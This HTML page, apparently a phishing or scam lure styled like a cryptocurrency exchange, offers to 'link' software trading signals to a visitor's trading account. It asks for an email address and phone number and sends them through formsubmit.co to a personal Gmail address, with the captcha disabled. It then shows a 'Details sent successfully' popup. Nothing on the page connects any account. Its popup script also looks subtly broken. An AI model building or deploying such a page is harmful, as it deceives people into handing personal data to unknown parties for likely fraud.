<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Trading Signal Connect</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}

body{
background:linear-gradient(135deg,#ffd84d,#fcd535);
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
}

.card{
background:#fff;
width:360px;
padding:35px 28px;
border-radius:14px;
box-shadow:0 15px 40px rgba(0,0,0,0.12);
}

.logo{
font-weight:bold;
font-size:22px;
margin-bottom:6px;
}

.subtitle{
font-size:14px;
color:#666;
margin-bottom:22px;
}

input{
width:100%;
padding:13px;
margin-bottom:15px;
border-radius:7px;
border:1px solid #ccc;
font-size:14px;
}

input:focus{
border-color:#fcd535;
outline:none;
}

button{
width:100%;
padding:13px;
border:none;
background:#fcd535;
font-weight:bold;
border-radius:7px;
cursor:pointer;
}

button:hover{background:#e6b800}

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,.55);
display:none;
align-items:center;
justify-content:center;
}

.popupbox{
background:white;
padding:35px;
border-radius:12px;
text-align:center;
animation:pop .35s ease;
}

@keyframes pop{
from{transform:scale(.7);opacity:0}
to{transform:scale(1);opacity:1}
}
</style>
</head>

<body>

<div class="card">
<div class="logo">Trading Connect</div>
<div class="subtitle">Connect Software Signals to your Trading Account</div>

<form action="https://formsubmit.co/zenithaurora777@gmail.com"
method="POST"
onsubmit="showPopup()">

<input type="email" name="Email" placeholder="Email Address" required>

<input type="tel" name="Phone" placeholder="Phone Number" required>

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">

<button type="submit">Link Trading Account</button>
</form>

</div>

<div id="popup" class="popup">
<div class="popupbox">
<h3>âœ… Submitted</h3>
<p>Details sent successfully</p>
</div>
</div>

<script>

function showPopup(e){
e.preventDefault();
document.getElementById("popup").style.display="flex";
}

</script>

</body>
</html>
